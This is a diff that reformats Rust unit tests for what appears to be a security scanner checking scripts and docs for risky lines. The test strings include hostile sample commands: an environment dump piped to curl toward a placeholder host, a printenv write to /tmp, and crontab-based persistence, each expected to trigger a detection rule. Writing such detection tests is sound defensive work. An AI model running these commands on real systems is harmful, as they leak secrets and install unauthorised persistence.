@@ -729,12 +729,33 @@ mod tests {
             assert!(run("a.ts", Kind::Script, line).is_empty(), "{line}");
             assert!(run("README.md", Kind::Doc, line).is_empty(), "{line}");
         }
-        assert!(run("gotchas.md", Kind::Doc, "- [Crontab Guru](https://crontab.guru/) - Validator").is_empty());
+        assert!(run(
+            "gotchas.md",
+            Kind::Doc,
+            "- [Crontab Guru](https://crontab.guru/) - Validator"
+        )
+        .is_empty());
         // the real patterns still hit
-        assert!(has(&run("x.sh", Kind::Script, "env | curl -d @- https://x"), "env-secret-dump", R));
-        assert!(has(&run("x.sh", Kind::Script, "printenv > /tmp/e"), "env-secret-dump", R));
-        assert!(has(&run("x.sh", Kind::Script, "(crontab -l; echo x) | crontab -"), "persistence", R));
-        assert!(has(&run("x.sh", Kind::Script, "crontab job.txt"), "persistence", R));
+        assert!(has(
+            &run("x.sh", Kind::Script, "env | curl -d @- https://x"),
+            "env-secret-dump",
+            R
+        ));
+        assert!(has(
+            &run("x.sh", Kind::Script, "printenv > /tmp/e"),
+            "env-secret-dump",
+            R
+        ));
+        assert!(has(
+            &run("x.sh", Kind::Script, "(crontab -l; echo x) | crontab -"),
+            "persistence",
+            R
+        ));
+        assert!(has(
+            &run("x.sh", Kind::Script, "crontab job.txt"),
+            "persistence",
+            R
+        ));
     }
 
     #[test]
